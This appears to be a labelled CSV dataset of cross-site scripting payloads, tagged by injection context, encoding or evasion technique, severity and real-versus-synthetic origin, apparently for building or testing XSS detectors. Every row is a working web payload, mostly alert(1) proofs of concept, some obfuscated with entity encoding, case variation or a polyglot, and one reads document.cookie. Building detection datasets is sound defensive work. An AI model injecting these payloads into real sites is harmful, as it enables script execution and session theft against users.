payload,context,technique,severity,length,source
＜script＞alert(123)＜/script＞,generic,none,medium,27,real
"<dd onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</dd>",event_handler,none,medium,59,real
"<frame onmousemove=""alert(1)"">AnonKryptiQuz</frame>",event_handler,none,medium,51,real
%22><svg onmouseover=prompt(%27XSS%27)>,tag_injection,synthetic,medium,39,synthetic
"<style>@keyframes x{}</style><basefont style=""animation-name:x"" onanimationend=""alert(1)""></basefont>",event_handler,none,medium,101,real
""" ontoggl&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,57,synthetic
%22><svg onmouseover=alert(1)>,tag_injection,synthetic,medium,30,synthetic
"<picture oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
"<meta draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",event_handler,none,medium,86,real
"<nobr oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
"<audio2 draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</audio2>",event_handler,none,medium,89,real
<b onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,51,real
"<data oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
<listing onfocusout=alert(1) tabindex=1 id=x></listing><input autofocus>,event_handler,none,medium,72,real
"<script>&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection,synthetic,medium,71,synthetic
"<area onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</area>",event_handler,none,medium,63,real
"<th onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</th>",event_handler,none,medium,80,real
"<nobr ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</nobr>",event_handler,none,medium,89,real
"<caption onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",event_handler,none,medium,75,real
<li onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</li><input value=clickme>,event_handler,none,medium,104,real
"<style>:target {transform: rotate(180deg);}</style><input id=x style=""transition:transform 2s"" ontransitionrun=print()></input>",event_handler,none,low,127,real
<figure onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
' ontoggle=alert(1) ',attribute_escape,synthetic,medium,21,synthetic
"<video2 draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</video2>",event_handler,none,medium,85,real
"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable style=display:block>drop here</sup>",event_handler,none,medium,123,real
"""`'><script>\x0Djavascript:alert(7364)</script>",script_injection,none,medium,47,real
""" ontoggl&#101;=&#97;l&#101;rt('XSS') """,attribute_escape,synthetic,medium,39,synthetic
<rb onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,64,real
"<a href=""javas\x06cript:javascript:alert(5943)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"<script onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</script>",script_injection,none,medium,71,real
%3C/script%3E%3Cimg%20src%3D1%20onerror%3Dalert(/xss/),generic,url_encoding,medium,54,real
"<marquee onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</marquee>",event_handler,none,medium,67,real
"<div id=d><x xmlns='""><iframe onload=alert(2)//'></div>",event_handler,none,medium,55,real
' onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,57,synthetic
"<frame onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</frame>",event_handler,none,medium,71,real
"EvaL(""ConSolE.lOg(LocAtiOn.HasH)"")",dom_sink,synthetic,medium,34,synthetic
"<summary onmousemove=""alert(1)"">AnonKryptiQuz</summary>",event_handler,none,medium,55,real
"<s oncontextmenu=""alert(1)"">AnonKryptiQuz</s>",event_handler,none,medium,45,real
%3Csvg onload=confirm(location.hash)/%3E,tag_injection,synthetic,medium,40,synthetic
"'''jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk={callback} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd={callback}//>\x3e''',",event_handler,comment_injection|url_encoding|case_variation,low,157,real
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationend=""alert(1)""></frameset>",event_handler,none,medium,101,real
<svg onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,59,synthetic
"<dl oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,95,real
"<img \x11src=x onerror=""javascript:alert(1)"">",event_handler,none,medium,45,real
<button popovertarget=x>Click me</button><plaintext ontoggle=alert(1) popover id=x>AnonKryptiQuz</plaintext>,event_handler,none,medium,108,real
""" onmouseover=alert('XSS') """,attribute_escape,synthetic,medium,28,synthetic
"<marquee onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",event_handler,none,medium,73,real
<svG oNbeGin=alErt(loCatIon.haSh)>,tag_injection,synthetic,medium,34,synthetic
"<hr onclick=""alert(1)"">AnonKryptiQuz</hr>",event_handler,none,medium,41,real
"<aside onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</aside>",event_handler,none,medium,69,real
<button popovertarget=x>Click me</button><hgroup ontoggle=alert(1) popover id=x>AnonKryptiQuz</hgroup>,event_handler,none,medium,102,real
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onwebkitanimationend=""alert(1)""></acronym>",event_handler,none,medium,105,real
"<body onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</body>",event_handler,none,medium,64,real
"<data onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</data>",event_handler,none,medium,70,real
javascript:prompt(/AnonKryptiQuz/.source);var x = prompt;x(0);x(/AnonKryptiQuz/.source);x,js_uri,none,medium,89,real
"""><svg onfocus=console.log(1)>",tag_injection,synthetic,medium,30,synthetic
<strong onpointerout=alert(1) style=display:block>AnonKryptiQuz</strong>,event_handler,none,medium,72,real
<rt onpointerup=alert(1) style=display:block>AnonKryptiQuz</rt>,event_handler,none,medium,63,real
&#x3c;img&#x2f;src&#x2f;onerror=alert('kalendra')&#x3e;,event_handler,html_entity,medium,55,real
<keygen onpointerout=alert(1) style=display:block>AnonKryptiQuz</keygen>,event_handler,none,medium,72,real
"<object onmouseout=""alert(1)"">AnonKryptiQuz</object>",event_handler,none,medium,52,real
';alert(123);t=',generic,none,medium,16,real
<iframe2 onpointermove=alert(1) style=display:block>AnonKryptiQuz</iframe2>,event_handler,none,medium,75,real
